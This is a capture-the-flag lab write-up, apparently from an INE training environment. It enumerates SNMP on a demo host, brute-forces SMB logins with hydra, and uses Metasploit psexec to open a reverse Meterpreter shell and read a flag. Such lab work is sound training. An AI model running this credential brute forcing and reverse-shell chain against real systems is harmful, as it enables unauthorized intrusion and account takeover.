## SNMP Analysis

### Target
* `demo.ine.local`
* `demo1.ine.local`

### Tools used:
* `nmap`
* `snmpwalk`
* `hydra`

### Objective: Exploit the target to gain a shell and find a flag!

---

```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sV -sU -p 161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 02:32 IST
Nmap scan report for demo.ine.local (10.3.27.107)
Host is up (0.0035s latency).
                                                                                                                                                                                           
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
Service Info: Host: AttackDefense

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sV -sU -p 161 --script snmp-brute
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 02:33 IST
Nmap scan report for demo.ine.local (10.3.27.107)
Host is up (0.0033s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
| snmp-brute: 
|   public - Valid credentials
|   private - Valid credentials
|_  secret - Valid credentials
Service Info: Host: AttackDefense

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
```
```bash
┌──(root㉿INE)-[~]
└─# snmpwalk -v 1 -c public demo.ine.local > snmpwalk_res.txt
```
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local -sV -sU -p 161 --script snmp-* > nmap_snmp.txt

┌──(root㉿INE)-[~]
└─# ls                                                                                                                                                                                     
Desktop  Documents  Downloads  Music  nmap_snmp.txt  Pictures  Public  snmp_walk_res.txt  snmpwalk_res.txt  Templates  thinclient_drives  Videos
```
```bash
┌──(root㉿INE)-[~]
└─# cat nmap_snmp.txt                                                                                                                                                                                                                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 02:40 IST
Nmap scan report for demo.ine.local (10.3.27.107)
Host is up (0.0035s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Guest
|   WDAGUtilityAccount
|_  admin
| snmp-brute: 
|   public - Valid credentials
|   private - Valid credentials
|_  secret - Valid credentials
```
```bash
┌──(root㉿INE)-[~]
└─# hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb                                                                              
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-25 02:44:40
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 2018 login tries (l:2/p:1009), ~2018 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: Administrator   password: elizabeth
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-25 02:44:42
```
```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPASS elizabeth
SMBPASS => elizabeth
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.40.9:4444 
[*] 10.3.27.107:445 - Connecting to the server...
[*] 10.3.27.107:445 - Authenticating to 10.3.27.107:445 as user 'Administrator'...
[*] 10.3.27.107:445 - Selecting PowerShell target
[*] 10.3.27.107:445 - Executing the payload...
[+] 10.3.27.107:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.3.27.107
[*] Meterpreter session 1 opened (10.10.40.9:4444 -> 10.3.27.107:49826) at 2026-01-25 02:46:45 +0530

meterpreter > 
```
```bash
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
01/03/2022  08:28 AM                70 FLAG1.txt
05/13/2020  05:58 PM    <DIR>          PerfLogs
11/07/2020  07:47 AM    <DIR>          Program Files
11/07/2020  07:47 AM    <DIR>          Program Files (x86)
11/07/2020  08:15 AM    <DIR>          Users
11/07/2020  07:49 AM    <DIR>          Utilities
11/07/2020  12:42 AM    <DIR>          Windows
               1 File(s)             70 bytes
               7 Dir(s)  16,018,358,272 bytes free

C:\>type flag1.txt
type flag1.txt
a8f5f167f44f4964e6c998dee827110c
```